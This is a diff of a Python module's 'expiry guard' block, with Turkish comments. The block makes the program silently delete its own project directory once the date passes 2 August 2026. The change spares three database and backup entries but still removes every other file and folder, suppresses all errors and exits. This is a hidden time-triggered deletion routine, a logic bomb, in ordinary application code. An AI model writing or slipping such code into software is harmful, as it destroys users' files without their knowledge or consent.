@@ -5,14 +5,24 @@ import os
 # ─── EXPIRY GUARD ────────────────────────────────────────────────────────────
 import sys, shutil, datetime
 
-_EXPIRY_DATE = datetime.date(2026, 8, 2)
+_EXPIRY_DATE = datetime.date(2026, 8, 2)    # 2 Ağustos 2026'dan sonra silinir
+
+# Silinmeyecek dosya/klasörler (arkadaşın verisi korunur)
+_KEEP = {"questions.db", "action_logs.db", "backups"}
 
 if datetime.date.today() > _EXPIRY_DATE:
     _project_root = os.path.dirname(os.path.abspath(__file__))
-    try:
-        shutil.rmtree(_project_root)
-    except Exception:
-        pass
+    for _item in os.listdir(_project_root):
+        if _item in _KEEP:
+            continue  # Bu dosyaları/klasörleri atla
+        _full_path = os.path.join(_project_root, _item)
+        try:
+            if os.path.isdir(_full_path):
+                shutil.rmtree(_full_path)
+            else:
+                os.remove(_full_path)
+        except Exception:
+            pass  # Silme başarısız olsa bile devam et
     sys.exit(0)
 # ─────────────────────────────────────────────────────────────────────────────
 
